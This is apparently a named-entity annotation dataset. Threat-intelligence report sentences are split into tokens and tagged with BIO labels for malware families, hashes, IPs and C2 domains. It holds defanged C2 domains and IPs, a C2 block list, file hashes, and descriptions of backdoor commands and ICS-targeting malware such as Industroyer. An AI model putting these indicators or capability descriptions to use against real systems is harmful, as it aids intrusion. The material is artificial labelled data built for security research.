. O

ASCII O
strings O
within O
the O
configuration O
data O
reveal O
a O
lot O
about O
Babar O
's O
intentions O
: O
Office O
executable O
names O
and O
associated O
document O
abbreviations O

Monitor O
ICS O
network O
traffic O
for O
unexpected O
communication O
flows O
and O
other O
anomalous O
activity O
. O

Function O
FormCryptoKey_sub_49D2F4 O
( O
) O

This O
determination O
expands O
upon O
the O
Joint O
Statement O
released O
October O
7 O
, O
2016 O
, O
from O
the O
Department O
of O
Homeland O
Security O
and O
the O
Director O
of O
National O
Intelligence O
on O
Election O
Security O
. O

Directory O
listing O
, O
poisoned O
StrongPity O
installers O
, O
at O
rarlrab[.]com B-url.normal

تارباخم O
عامتجا O
رضحم O
رورم O
تاملك O
رس O
تاملك O
رورملا O
تاملك O
رسلا O
تاملك O
رسلا O
تاملك O
تانايب O
ةدعاق O
ةقيثو O
ةيتاذ O
ةريس O
اتيس O
يركسع O
ينمأ O
تلايميلإا O
تارابختسا O

Lastly O
, O
during O
the O
investigation O
, O
Cybereason O
noticed O
that O
some O
of O
the O
C O
& O
C O
domains O
and O
IPs O
started O
to O
emerge O
on O
VirusTotal B-url.normal
and O
other O
threat O
intelligence O
engines O
, O
with O
payloads O
that O
were O
not O
observed O
during O
Cobalt O
Kitty O
. O

We O
discovered O
over O
400 O
previously O
unreported O
SSH O
sessions O
between O
CSRI O
ranges O
and O
Spanish O
government O
and O
university O
networks O
from O
April O
4 O
, O
2018 O
to O
April O
9 O
, O
2018 O
. O

Sunday O
, O
May O
04 O
, O
2014 O
The O
greatest O
education O
in O
the O
world O
is O
watching O
the O
masters O
at O
work O
. O

export O
function O
. O

[ O
OP O
PL O
] O
. O

As O
mentioned O
previously O
, O
IRONGATE B-malware.backdoor
seeks O
to O
manipulate O
code O
similar O
to O
that O
found O
on O
a O
blog O
dealing O
with O
simulating O
PLC O
communications O
using O
PLCSIM O
, O
including O
the O
use O
of O
an O
executable O
named O
biogas.exe O
. O

A O
previous O
campaign O
of O
this O
APT O
group O
was O
uncovered O
by O
Talos O
in O
June O
2017 O
, O
and O
since O
then O
very O
little O
of O
this O
operation O
was O
seen O
in O
the O
wild O
. O

The O
binary O
is O
indeed O
statically O
linked O
with O
OpenSSL O
library O
, O
such O
that O
it O
really O
does O
look O
like O
an O
SSH O
tool O
. O

Once O
the O
attacks O
are O
completed O
the O
DarkComet B-malware.backdoor
bot O
will O
respond O
with O
an O
encrypted O
status O
message O
such O
as O
the O
following O
: O

However O
, O
the O
choice O
of O
bank O
supervisor O
/ O
state-bank O
websites O
would O
be O
apt O
, O
given O
their O
previous O
targeting O
of O
Central O
Banks O
for O
Heists O
– O
even O
when O
it O
serves O
little O
operational O
benefit O
for O
infiltrating O
the O
wider O
banking O
sector O
. O

This O
makes O
the O
RAT B-malware.backdoor
unstable O
as O
multiple O
instances O
may O
be O
executed O
simultaneously O
on O
the O
same O
host O
machine O
causing O
unexpected O
behavior O
. O

We O
can O
see O
that O
the O
authors O
adapted O
features O
to O
the O
Windows O
versions O
, O
patched O
bugs O
, O
added O
obfuscation O
etc O
... O
The O
biggest O
update O
was O
performed O
to O
version O
3.00 O
, O
after O
two O
years O
of O
silence O
. O

The O
malware O
then O
walks O
the O
list O
of O
processes O
and O
modules O
looking O
for O
installed O
AV O
software O
. O

19968 O
19840 O
26616 O

In O
all O
examples O
of O
ScanBox B-malware.infosteal
deployments O
discussed O
so O
far O
, O
we O
believe O
that O
the O
scripts O
were O
deployed O
to O
anyone O
who O
visited O
websites O
of O
interest O
to O
a O
given O
sector O
which O
the O
attacker O
was O
able O
to O
compromise– O
and O
that O
the O
attackers O
waited O
for O
victims O
to O
visit O
the O
compromised O
site O
. O

Figure O
1 O
- O
Extracted O
files O

Finally O
, O
it O
marks O
ZxShell B-malware.backdoor
main O
Dll O
for O
deletion O
with O
the O
MoveFileEx O

Web O
. O

In-depth O
investigation O
of O
the O
attack O
reveal O
that O
preparation O
went O
back O
as O
early O
as O
September O
2010 O
before O
finally O
culminating O
in O
the O
compromise O
of O
the O
user O
databases O
between O
July O
26-28 O
, O
2011 O
. O

Hash O
Downloader O
used O
in O
the O
campaign O
: O

June O
9 O
, O
2016 O
The O
memory O
cleaner O
function O
generates O
random O
bytes O
and O
fills O
the O
memory O
area O
. O

Our O
analysis O
finds O
that O
IRONGATE B-malware.backdoor
invokes O
ICS O
attack O
concepts O
first O
seen O
in O
Stuxnet O
, O
but O
in O
a O
simulation O
environment O
. O

The O
HTML O
source O
of O
this O
page O
is O
displayed O
in O
the O
following O
image O
. O

Full O
File O
Path O
: O
SHA256 O
: O
File O
Size O
: O
Compile O
Time O
: O

While O
the O
Double O
XOR O
is O
a O
trivial O
technique O
, O
it O
is O
the O
sum O
of O
the O
routines O
and O
keys O
used O
in O
malware O
that O
can O
end O
up O
leading O
to O
attribution O
. O

Figure O
1 O
: O
Example O
APT32 B-malware.infosteal
Phishing O
Lure O
– O
Fake O
Gmail O
Error O
Message O
Figure O
2 O
: O
Example O
APT32 B-malware.infosteal
Phishing O
Lure O
– O
Fake O
Text O
Encoding O
Error O
Message O
APT32 B-malware.infosteal
operators O
implemented O
several O
novel O
techniques O
to O
track O
the O
efficacy O
of O
their O
phishing O
, O
monitor O
the O
distribution O
of O
their O
malicious O
documents O
, O
and O
establish O
persistence O
mechanisms O
to O
dynamically O
update O
backdoors O
injected O
into O
memory O
. O

Description O

In O
each O
of O
the O
attacks O
the O
infection O
method O
was O
almost O
identical O
and O
included O
an O
extraordinary O
number O
of O
stages O
used O
to O
avoid O
detection O
. O

APT12 O
's O
adaptations O
to O
public O
disclosures O
lead O
FireEye O
to O
make O
several O
conclusions O
about O
this O
threat O
group O
: O
APT12 O
closely O
monitors O
online O
media O
related O
to O
its O
tools O
and O
operations O
and O
reacts O
when O
its O
tools O
are O
publicly O
disclosed O
. O

It O
is O
widely O
believed O
that O
Iran O
's O
Natanz O
nuclear O
Fuel O
Enrichment O
Plant O
( O
FEP O
) O
was O
the O
intended O
target O
. O

After O
achieving O
persistence O
and O
dropping O
the O
executable O
, O
the O
legitimate O
Symantec O
executable O
, O

Each O
encrypted O
directory O
will O
have O
a O
ransom O
note O
left O
in O
it O
: O

Our O
analysis O
begins O
with O
the O
exploit O
document O
named O
' O
Draft O
PH-US O
Dialogue O
on O
Cyber O
Security.doc O
' O
that O
takes O
advantage O
of O
the O
CVE-2017-11882 O
vulnerability O
. O

90e11bdbc380c88244bb0152f1142aff B-hash

다양한 O
종류의 O
악성코드 O
가 O
사용되었으며 O
, O
nc.exe B-malware.drop
, O
nt.exe B-malware.drop
, O
n5lic.exe B-malware.drop
, O
nc5rt2.exe B-malware.drop
, O
Bin.exe B-malware.drop
등이 O
있다 O
. O

This O
campaign O
leveraged O
four O
different O
lures O
and O
targeted O
Korean-speaking O
users O
of O
the O
Hangul O
Word O
Processor O
( O
.hwp O
file O
extension O
) O
, O
a O
Korean-language O
word O
processing O
program O
utilized O
widely O
in O
South O
Korea O
. O

It O
is O
important O
to O
note O
that O
, O
all O
the O
Sandboxes O
we O
know O
are O
disabling O
to O
fight O
against O
this O
kind O
of O
attack O
. O

Figure O
6 O
: O
APT32 B-malware.infosteal
Attack O
Lifecycle O
Based O
on O
incident O
response O
investigations O
, O
product O
detections O
, O
and O
intelligence O
observations O
along O
with O
additional O
publications O
on O
the O
same O
operators O
, O
FireEye O
assesses O
that O
APT32 O
is O
a O
cyber O
espionage O
group O
aligned O
with O
Vietnamese O
government O
interests O
. O

These O
variants O
require O
a O
loader O
component O
to O
load O
them O
into O
memory O
in O
order O
to O
be O
executed O
. O

All O
rights O
reserved O
. O

The O
HTTP O
traffic O
generated O
by O
both O
samples O
uses O
a O
limited O
number O
of O
header O
fields O
, O
which O
is O
substantially O
different O
from O
the O
majority O
of O
traffic O
generated O
by O
modern O
browsers O
. O

Intelligence O
Report O
Israel O
's O
strategic O
position O
has O
improved.exe O

The O
first O
stage O
payload O
( O
example O
: O

This O
payload O
then O
creates O
a O
DLL O
file O
in O
system32 O
called O
CREDRIVER.dll O
, O
which O
is O
in O
fact O
the O
actual O
backdoor O
: O

i= O

또한 O
공격 O
대상 O
( O
target O
) O
이 O
사용하는 O
소프트웨어의 O
취약점을 O
이용 O
한 O
공격이 O
빈번한 O
점 O
등으로 O
미루어 O
한국의 O
IT O
환경에 O
대해 O
상당히 O
파악하고 O
있는 O
것으로 O
보인다 O
. O

The O
networks O
abused O
were O
designed O
for O
internet O
communications O
with O
ships O
at O
sea O
which O
span O
a O
greater O
geographical O
area O
at O
nearly O
global O
scale O
, O
while O
providing O
nearly O
no O
security O
for O
their O
downlinks O
. O

This O
attack O
vector O
will O
likely O
use O
a O
well-crafted O
email O
containing O
either O
a O
malicious O
file O
or O
web O
hyperlink O
to O
what O
recipients O
believe O
is O
the O
actual O
website O
; O
but O
is O
instead O
a O
fake O
landing O
page O
. O

, O
Upload O
& O
Execute O
additional O
malware O
, O
Capture O
Webcam O
, O
Remote O
Desktop O
, O
File O
Manager O
, O
Browser O
Password O
Recovery O
, O
Capture O
Microphone O
, O
Keylogger O
, O
etc O
. O

What O
links O
Babar64 B-malware.drop
to O
other O
families O
analyzed O
beforehand O
, O
such O
as O
Bunny B-malware.unknown
or O
TFC O
( O
also O
called O
NBOT B-malware.unknown
) O
are O
shared O
portions O
of O
source O
code O
and O
re-used O
coding O
techniques O
. O

PUSH/JMP O
technique O

This O
technique O
may O
very O
likely O
be O
deployed O
in O
the O
political O
, O
government O
, O
or O
non-governmental O
sectors O
in O
the O
near O
future O
. O

13 O
Dec O
. O

' O
Russia O
State-Sponsored O
Doping O
Across O
Majority O
of O
Olympic O
Sports O
, O
Claims O
Report O
. O
' O

Injected O
link O
with O
the O
file O
scheme O
Injected O
link O
with O
the O
file O
scheme O

We O
analyzed O
a O
recently O
acquired O
malware O
sample O
and O
identified O
it O
as O
FinSpy B-malware.backdoor
. O

Serial O
number O
Figure O
12 O
. O

Enforce O
a O
strict O
lockout O
policy O
for O
network O
users O
and O
closely O
monitor O
logs O
for O
failed O
login O
activity O
. O

Current O
SPLM B-malware.backdoor
code O
maintains O
the O
unusual O
cipher O
hack O
that O
Sofacy O
began O
deploying O
in O
2017 O
to O
hide O
away O
configuration O
details O
. O

BEYOND O
BABAR B-malware.drop
............................................................................................. I-malware.drop
16 I-malware.drop
5 O
. O

However O
, O
in O
this O
attack O
, O
this O
file O
is O
used O
to O
load O
the O
Hussarini B-malware.backdoor
backdoor O
via O
DLL B-malware.backdoor
hijacking O
. O

Although O
a O
regional O
actor O
, O
the O
group O
has O
followed O
two O
trends O
seen O
globally O
among O
targeted O
attack O
groups O
. O

Both O
adversaries O
engage O
in O
extensive O
political O
and O
economic O
espionage O
for O
the O
benefit O
of O
the O
government O
of O
the O
Russian O
Federation O
and O
are O
believed O
to O
be O
closely O
linked O
to O
the O
Russian O
government O
's O
powerful O
and O
highly O
capable O
intelligence O
services O
. O

We O
encountered O
the O
first O
document O
exploit O
called O
' O
THAM O
luan- O
GD- O
NCKH2.doc O
' O
a O
few O
days O
ago O
, O
which O
appears O
to O
be O
leveraging O
some O
vulnerabilities O
patched O
with O
MS12-060 O
. O

a3cbf6179d437909eb532b7319b3dafe O
- O
custom O
keylogger O
1369fee289fe7798a02cde100a5e91d8 O
- O
UPX O
compressed O
' O
dnsquery.exe O
' O
c0c03b71684eb0545ef9182f5f9928ca O
- O
dnsquery.exe O

( O
? O
? O
? O

Take O
steps O
to O
harden O
both O
Web O
applications O
and O
the O
servers O
hosting O
them O
to O
reduce O
the O
risk O
of O
network O
intrusion O
via O
this O
vector O
. O

At O
the O
same O
time O
, O
the O
main O
instance O
creates O
six O
named O
pipes O
using O
the O
very O
same O
GUID O
. O

Cyberspace O
Research O
Institute O
of O
Iran O

IRONGATE B-malware.backdoor
actively O
records O
and O
plays O
back O
process O
data O
to O
hide O
manipulations O
, O
whereas O
Stuxnet O
did O
not O
attempt O
to O
hide O
its O
process O
manipulation O
, O
but O
suspended O
normal O
operation O
of O
the O
S7-315 O
so O
even O
if O
rotor O
speed O
had O
been O
displayed O
on O
the O
HMI O
, O
the O
data O
would O
have O
been O
static O
. O

This O
function O
implements O
the O
initial O
handshake O
which O
consists O
of O
exchanging O
16 O
bytes O
, O
0x00001985 O
and O
0x00000425 O
, O
with O
the O
server O
. O

The O
framework O
has O
remained O
in O
use O
since O
initial O
analyses O
were O
published O
, O
and O
further O
analysis O
of O
the O
code O
, O
public O
reporting O
, O
as O
well O
as O
the O
infrastructure O
used O
to O
host O
ScanBox B-malware.infosteal
infections O
has O
given O
us O
a O
better O
picture O
of O
some O
of O
the O
clusters O
of O
activity O
we O
identified O
in O
our O
earlier O
blog O
. O

The O
dropped O
implant O
, O
showppt.scr O
( O
MD5 O
: O
165ac370b54e664812e4c15b2396ccd6 B-hash
) O
, O
is O
a O
downloader O
that O
connects O
to O
http[:]//199.91.173[.]45/ B-ip.unknown
and O
downloads O
both O
legitimate O
library O
files O
and O
malicious O
second O
stage O
binaries O
. O

They O
will O
be O
able O
to O
steal O
and O
resell O
in O
the O
underground O
market O
the O
sensitive O
data O
of O
each O
victim O
. O

The O
following O
table O
summarizes O
the O
main O
C2 O
commands O
supported O
by O
this O
PowerShell O
Script O
. O

All O
the O
files O
described O
here O
, O
whether O
they O
were O
sent O
in O
an O
email O
or O
downloaded O
while O
visiting O
a O
compromised O
site O
, O
deliver O
the O
same O
( O
functionally O
equivalent O
) O
backdoor O
component O
. O

Figure O
13 O
: O
Popup O
message O
when O
users O
open O
the O
document O
that O
abuses O
DDEAUTO O
Figure O
14 O
. O

Command O
' O
exec O
' O
- O
standard O
process O
creation O
: O

buffer O
after O
base64 O
decoding O
: O

This O
campaign O
also O
targeted O
South O
Korean O
college O
students O
interested O
in O
foreign O
affairs O
and O
part O
of O
a O
group O
called O
' O
Friends O
of O
MOFA O
' O
( O
Ministry O
of O
Foreign O
Affairs O
) O
. O

The O
functionality O
of O
this O
module O
is O
as O
follows O
: O
calling O
the O
function O
of O
wininet O
module O
, O
connecting O
the O
network O
, O
downloading O
operations O
of O
module O
2 O
; O
and O
executing O
by O
downloading O
to O
the O
memory O
. O

Threat O
Actor O
Attribution O
................................................................................................................................................................................................................................................................................. O
17 O
Campaign O
# O
1 O
: O
Moafee B-malware.infosteal
.............................................................................................................................................................................................................................................................................. O
17 O
Campaign O
# O
2 O
: O
DragonOK B-malware.infosteal
................................................................................................................................................................................................................................................................ O
19 O

With O
approximately O
435,000 O
people O
serving O
clients O
in O
more O
than O
120 O
countries O
, O
Accenture O
drives O
innovation O
to O
improve O
the O
way O
the O
world O
works O
and O
lives O
. O

Figure O
2 O
represents O
the O
relationship O
between O
cyber O
security O
and O
safety O
controls O
in O
a O
process O
control O
environment O
. O

C O
& O
C O
: O

All O
trademarks O
are O
properties O
of O
their O
respective O
owners O
. O

by O
CH O
Lei O
, O
Fyodor O
Yarochkin O
, O
Lenart O
Bermejo O
, O
Philippe O
Z O
Lin O
and O
Razor O
Huang O

Decrypted O
log O
at O
/var/tmp/.pipe.sock O
Decrypted O
log O
at O
/var/tmp/.pipe.sock O

New O
variants O
of O
Denis O
and O
Goopy B-malware.backdoor
backdoors O
PowerShell O
Restriction O
Bypass O
Tool O
– O
Adapted O
from O
PSUnlock O
Github O
project O
. O

Win32/Industroyer B-malware.backdoor
: O
a O
new O
threat O
for O
industrial O
control O
systems O
2 O
Main O
backdoor O
Additional O
backdoor O
4 O
Launcher O
component O
101 O
payload O
component O
6 O
104 O
payload O
component O
7 O
61850 O
payload O
component O
OPC O
DA O
payload O
component O
12 O
Data O
wiper O
component O
Additional O
tools O
: O
port O
scanner O
tool O
14 O
Additional O
tools O
: O
DoS O
tool O
15 O
Conclusion O
15 O
Indicators O
of O
Compromise O
( O
IoC O
) O
Win32/Industroyer B-malware.backdoor
is O
a O
sophisticated O
piece O
of O
malware O
designed O
to O
disrupt O
the O
working O
processes O
of O
industrial O
control O
systems O
( O
ICS O
) O
, O
specifically O
industrial O
control O
systems O
used O
in O
electrical O
substations O
Those O
behind O
the O
Win32/Industroyer B-malware.backdoor
malware O
have O
a O
deep O
knowledge O
and O
understanding O
of O
industrial O
control O
systems O
and O
, O
specifically O
, O
the O
industrial O
protocols O
used O
in O
electric O
power O
systems O
Moreover O
, O
it O
seems O
very O
unlikely O
anyone O
could O
write O
and O
test O
such O
malware O
without O
access O
to O
the O
specialized O
equipment O
used O
in O
the O
specific O
, O
targeted O
industrial O
environment O
Support O
for O
four O
different O
industrial O
control O
protocols O
, O
specified O
in O
the O
standards O
listed O
below O
, O
has O
been O
implemented O
by O
the O
malware O
authors O
: O
IEC O
60870-5-101 O
( O
aka O
IEC O
101 O
) O
IEC O
60870-5-104 O
( O
aka O
IEC O
104 O
) O
IEC O
61850 O
OLE O
for O
Process O
Control O
Data O
Access O
( O
OPC O
DA O
) O
In O
addition O
to O
all O
that O
, O
the O
malware O
authors O
also O
wrote O
a O
tool O
that O
implements O
a O
denial-of-service O
( O
DoS O
) O
attack O
against O
a O
particular O
family O
of O
protection O
relays O
, O
specifically O
the O
Siemens O
SIPROTEC O
range O
All O
this O
considered O
, O
the O
Win32/Industroyer B-malware.backdoor
malware O
authors O
show O
an O
intensive O
focus O
that O
suggests O
they O
are O
highly O
specialized O
in O
industrial O
control O
systems O
The O
capabilities O
of O
this O
malware O
are O
significant O
When O
compared O
to O
the O
toolset O
used O
by O
threat O
actors O
in O
the O
2015 O
attacks O
against O
the O
Ukrainian O
power O
grid O
which O
culminated O
in O
a O
black O
out O
on O
December O
23 O
, O
2015 O
( O
BlackEnergy B-malware.unknown
, O
KillDisk B-malware.ransom
, O
and O
other O
components O
, O
including O
legitimate O
remote O
access O
software O
) O
the O
gang O
behind O
Industroyer B-malware.backdoor
are O
more O
advanced O
, O
since O
they O
went O
to O
great O
lengths O
to O
create O
malware O
capable O
of O
directly O
controlling O
switches O
and O
circuit O
breakers O
We O
have O
seen O
indications O
that O
this O
malware O
could O
have O
been O
the O
tool O
used O
by O
attackers O
to O
cause O
the O
power O
outage O
in O
Ukraine O
in O
December O
2016 O
, O
although O
at O
the O
time O
of O
writing O
, O
it O
is O
not O
confirmed O
, O
and O
the O
investigation O
is O
still O
ongoing O
The O
infection O
vector O
remains O
unknown O
The O
malware O
contains O
multiple O
modules O
, O
as O
analyzed O
and O
described O
in O
the O
next O
sections O
of O
this O
whitepaper O
However O
, O
before O
diving O
into O
those O
details O
, O
the O
following O
simplified O
schematic O
shows O
the O
connections O
between O
the O
components O
of O
the O
malware O
While O
some O
components O
( O
e O
g O
Data O
wiper O
) O
are O
similar O
in O
concept O
to O
the O
2015 O
BlackEnergy B-malware.unknown
attacks O
against O
power O
grid O
companies O
in O
Ukraine O
, O
we O
do O
n't O
see O
any O
link O
between O
those O
attacks O
and O
the O
code O
in O
this O
malware O
We O
refer O
to O
the O
core O
component O
of O
Industroyer B-malware.backdoor
as O
the O
main O
backdoor O
The O
main O
backdoor O
is O
used O
by O
the O
attackers O
behind O
Industroyer B-malware.backdoor
to O
control O
all O
other O
components O
of O
the O
malware O
As O
backdoors O
go O
, O
this O
component O
is O
pretty O
straightforward O
, O
connecting O
to O
its O
remote O
C O
& O
C O
server O
using O
HTTPS O
and O
receiving O
commands O
from O
the O
attackers O
All O
analyzed O
samples O
are O
hardcoded O
to O
use O
the O
same O
proxy O
address O
, O
located O
in O
the O
local O
network O
Thus O
, O
the O
backdoor O
is O
clearly O
designed O
to O
work O
only O
in O
one O
specific O
organization O
It O
is O
also O
worth O
mentioning O
that O
most O
of O
the O
C O
& O
C O
servers O
used O
by O
this O
backdoor O
are O
running O
Tor O
software O
Perhaps O
the O
most O
interesting O
feature O
of O
this O
backdoor O
is O
that O
attackers O
can O
define O
a O
specific O
hour O
of O
the O
day O
when O
the O
backdoor O
will O
be O
active O
For O
example O
, O
the O
attackers O
can O
modify O
the O
backdoor O
in O
this O
way O
so O
it O
will O
communicate O
with O
its O
C O
& O
C O
server O
only O
outside O
working O
hours O
This O
can O
make O
detection O
based O
only O
on O
network O
traffic O
examination O
harder O
However O
, O
all O
the O
samples O
analyzed O
so O
far O
are O
set O
to O
work O
24 O
hours O
round O
the O
clock O
Once O
connected O
to O
its O
remote O
C O
& O
C O
server O
, O
the O
main O
backdoor O
component O
sends O
the O
following O
data O
in O
a O
POST-request O
: O
the O
globally O
unique O
identifier O
( O
GUID O
) O
string O
for O
the O
current O
hardware O
profile O
retrieved O
via O
the O
version O
of O
the O
malware O
: O
1 O
1e O
the O
hardcoded O
ID O
of O
the O
sample O
the O
result O
of O
any O
previously-received O
command O
The O
hardcoded O
ID O
is O
used O
by O
the O
attacker O
as O
an O
identifier O
for O
the O
infected O
machine O
Across O
all O
analyzed O
samples O
we O
found O
the O
following O
hardcoded O
ID O
values O
: O
DEF-C O
DEF-WS O
DEF-EP O
DC-2-TEMP O
DC-2 O
CES-McA-TEMP O
SRV_WSUS O
SRV_DC-2 O
SCE-WSUS01 O
The O
main O
backdoor O
component O
supports O
the O
following O
commands O
: O

This O
document O
pretends O
to O
be O
a O
press O
report O
and O
contains O
news O
headlines O
that O
were O
actually O
copied O
from O
various O
Palestinian O
news O
websites O
. O

Service O
Key O
& O
Value O
Note O
: O
deleted O
after O
drop O
Path O
to O
backdoor O
Note O
: O
deleted O
after O
stage O
1 O
Path O
to O
backdoor O
Note O
: O
persistent O
SOFTWARE\Microsoft\Windows O
NT\ O
CurrentVersion\SvcHost\ O

It O
's O
worth O
noting O
that O
the O
function O
names O
used O
in O
the O
PostScript O
are O
transliterated O
Chinese O
words O
. O

TABLE O
3 O
: O
COZYDUKE B-malware.drop
MODULES O
Module O
Type O

The O
UDP O
and O
TCP O
volumetric O
floods O
are O
quite O
unremarkable O
and O
simply O
consist O
of O
random O
gibberish O
blasted O
at O
a O
target O
host O
and O
port O
. O

If O
the O
active O
window O
is O
Tencent B-malware.drop
QQ I-malware.drop
( O
specifically O
, O
QQ2009 B-malware.drop
through O
QQ2012 B-malware.drop
) O
, O
EvilGrab B-malware.drop
will O
attempt O
to O
steal O
information O
by O
directly O
reading O
the O
process O
's O
memory O
and O
checking O
if O
the O
class O
name O
of O
the O
focused O
window O
is O
not O
named O
' O
EDIT O
. O
' O

Microsoft O
has O
fixed O
the O
vulnerability O
and O
named O
it O
CVE-2018-8174 B-malware.unknown
. O

To O
effectively O
defend O
against O
the O
threats O
described O
in O
this O
report O
, O
iDefense O
recommends O
blocking O
access O
to O
the O
following O
C2 B-url.unknown
domains I-url.unknown
and O
IP O
addresses O
: O
firefoxcomt.arkouowi[.]com B-url.cncsvr
update.arkouowi[.]com B-url.cncsvr
friendlysupport.giize[.]com B-url.cncsvr
algorithm.ddnsgeek[.]com B-url.cncsvr
149.36.63[.]65 O
83.136.106[.]108 O
Hashes O
( O
SHA-256 O
) O
: O

안다리엘 O
그룹은 O
2016년 O
8월부터 O
백신 O
관리 O
프로그램의 O
취약점을 O
이용해 O
군사 O
관련 O
기관 O
내부를 O
공격해 O
군사 O
정보를 O
유출한다 O
. O

Figure O
4 O
: O
RATANKBA B-malware.backdoor
main O
console O
interface O
Figure O
5 O
: O
RATANKBA B-malware.backdoor
host O
manipulation O
console O

Since O
the O
group O
's O
emergence O
in O
2007 O
, O
Bitdefender O
has O
become O
familiar O
with O
the O
backdoors O
used O
to O
compromise O
Windows O
and O
Linux O
targets O
, O
such O
as O
Coreshell O
, O
Jhuhugit O
and O
Azzy O
for O
the O
former O
OS O
or O
Fysbis O
for O
the O
latter O
. O

Office O
2016.exe O
edikvlxhprg.lnk O
edikvlxhprg.exe O
plugin.exe O
Fared-Ismael.rar O

If O
some O
of O
these O
are O
detected O
, O
it O
quits O
its O
execution O
. O

PowerShell O
Environment O
Variables O
: O
Nowadays O
, O
malware O
authors O
commonly O
mask O
critical O
strings O
such O
as O
' O
IEX O
' O
using O
environment O
variables O
. O

function O
is O
located O
at O
0x01437036 O
in O
our O
case O
. O

Accepted O
payment O
methods O
are O
the O
usual O
virtual O
currencies O
and O
pre-paid O
options O
. O

www.FireEye.com B-url.normal

The O
FireEye O
Threat O
Prevention O
Platform O
provides O
real-time O
, O
dynamic O
threat O
protection O
without O
the O
use O
of O
signatures O
to O
protect O
an O
organization O
across O
the O
primary O
threat O
vectors O
, O
including O
Web O
, O
email O
, O
and O
files O
and O
across O
the O
different O
stages O
of O
an O
attack O
life O
cycle O
. O

After O
having O
described O
Dino B-malware.backdoor
's O
basics O
, O
we O
are O
now O
going O
to O
dig O
into O
two O
particularly O
interesting O
components O
; O
first O
, O
a O
custom O
file O
system O
used O
by O
the O
malware O
, O
and O
then O
the O
CRONTAB O
module O
in O
charge O
of O
task O
scheduling O
. O

While O
WhiteBear O
is O
Turla O
related O
, O
it O
is O
interesting O
to O
compare O
to O
other O
ongoing O
development O
styles O
. O

So O
, O
the O
malware O
does O
not O
have O
any O
clever O
persistence O
features O
either O
. O

If O
it O
is O
actually O
malicious O
, O
it O
is O
possible O
the O
code O
could O
be O
re-activated O
at O
any O
time O
. O

and O
how O
the O
malware O
communicates O
with O
its O
C O
& O
C O
servers O
. O

Here O
is O
list O
of O
commands O
that O
it O
can O
receive O
from O
C O
& O
C O
server O
: O
Command O
Purpose O
0x02 O
0x03 O
0x04 O
0x05 O
0x06 O
0x07 O
0x08 O
Collects O
information O
about O
computer O
: O
Computer O
Name O
, O
User O
Name O
, O
Windows O
Version O
, O
Architecture O
( O
32/64 O
bit O
) O
and O
campaign O
ID O
Collects O
list O
of O
running O
processes O
Downloads O
binary O
to O
% O
TEMP O
% O
and O
executes O
Updates O
itself O
Deletes O
itself O
Makes O
screenshot O
Loads O
binary O
in O
the O
memory O
, O
without O
dropping O
to O
the O
disk O
The O
latest O
sample O
of O
this O
malware O
family O
found O
in O
the O
wild O
is O
also O
digitally O
signed O
with O
a O
different O
certificate O
: O
The O
certificate O
details O
: O
Company O
name O
: O
In O
travel O
TOV O
Validity O
: O
from O
21 O
July O
2015 O
to O
21 O
July O
2016 O
Thumbprint O
: O
7809fbd8d24949124283b9ff14d12da497d9c724 O
Serial O
number O
: O
00dfd915e32c5f3181a0cdf0aff50f8052 O
Subject O
: O
CN O
= O
In O
travel O
TOV O
O O
= O
In O
travel O
TOV O
STREET O
= O
prospekt O
Pravdi O
33 O
L O
= O
Kiev O
S O
= O
Kievskaja O
PostalCode O
= O
04108 O
C O
= O
UA O
Also O
, O
the O
latest O
sample O
is O
able O
to O
gain O
system O
privileges O
via O
an O
exploit O
and O
install O
itself O
as O
a O
system O
service O
. O

After O
inspecting O
the O
njRAT B-malware.backdoor
builder O
kit O
it O
was O
determined O
that O
this O
individual O
customized O
the O
existing O
njRAT B-malware.backdoor
builder O
kit O
to O
bypass O
security O
products O
. O

pcon.exe O
, O
portc.exe O
, O
zcon.exe O
등의 O
파일 O
이름으로 O
IP와 O
포트를 O
확인하는 O
도구도 O
사용했다 O
. O

CreateMutexA O
is O
183 O
( O
\xB7 O
) O
, O
which O
corresponds O
to O
' O
ERROR_ALREADY_EXISTS O
' O
9 O
. O

But O
the O
decision O
by O
the O
attacker O
to O
use O
a O
widely O
known O
security O
application O
as O
an O
embedded O
decoy O
is O
a O
slightly O
more O
sophisticated O
ploy O
to O
the O
average O
user O
or O
to O
a O
less O
experienced O
systems O
administrator O
. O

https://www.facebook.com/%D8%AA%D9%85%D8%B1%D8%AF-%D8%A7%D9%84%D8%B6%D9%81%D8% B-url.normal
A9-%D8%A7%D9%84%D8%BA%D8%B1%D8%A8%D9%8A%D8%A9-542062199177072/ I-url.normal

McAfee O
Policy O
Auditor O
SCAP O
MNAC O
SCAP O

One O
such O
email O
, O
shown O
in O
Figure O
2 O
and O
used O
by O
the O
DragonOK B-malware.infosteal
group O
was O
written O
in O
traditional O
Chinese O
, O
and O
targeted O
a O
Taiwanese O
technology O
firm O
The O
primary O
observed O
attack O
vector O
used O
by O
both O
groups O
is O
spear-phishing O
emails O
. O

Killkill O
: O
S O
tops O
the O
backdoor O
's O
activities O

NOV O
( O
2015 O
) O
JULY O
18 O
AUG O
4 O

Additionally O
, O
CozyDuke B-malware.drop
may O
utilize O
a O
technique O
known O
as O
COM-object O
hijacking O
to O
establish O
persistence O
. O

35 O
million O
users O
months O

Eventually O
the O
hackers O
will O
implant O
backdoor O
Trojan B-malware.backdoor
to O
completely O
control O
the O
computer O
. O

SYSTEM\CurrentControlSet\Services\ O
RaS O
? O
? O

If O
the O
file O
system O
is O
not O
recognized O
then O
it O
is O
possible O
that O
the O
MBR O
will O
need O
to O
be O
reconstructed O
, O
though O
this O
is O
unlikely O
. O

The O
following O
lists O
three O
points O
. O

The O
real O
malicious O
code O
is O
running O
in O
the O
background O
as O
Android O
service O
. O

Further O
analysis O
is O
on-going O
to O
understand O
the O
history O
of O
this O
malware O
variant O
. O

45.114.117[.]137 B-ip.unknown
) O
ID2016.doc O
bfb3ca77d95d4f34982509380f2f146f63aa41bc B-hash
2016-11-23 O
08:18:43 O
Malicious O
Word O
document O
( O
Phishing O
text O
in O
Vietnamese O
) O
blog(.)versign(.)info B-url.cncsvr
( O
23.227.196[.]210 B-ip.unknown
) O
blog(.)versign(.)info B-url.cncsvr
( O
23.227.196[.]210 B-ip.unknown
) O
tx32.dll O
604a1e1a6210c96e50b72f025921385fad943ddf B-hash
2016-08-15 O
04:04:46 O

At O
this O
stage O
, O
the O
malware O
gathers O
information O
about O
the O
infected O
computer O
. O

These O
targets O
include O
some O
in O
academia O
which O
have O
received O
military O
funding O
for O
their O
research O
projects O
relating O
to O
unmanned O
vehicles O
. O

The O
BBC O
. O

' O
ghijklmnop O
' O
( O
' O
UTF-16LE O
' O
) O
( O
' O
hex O
' O
) O
0x2f O
< O
( O
) O
< O
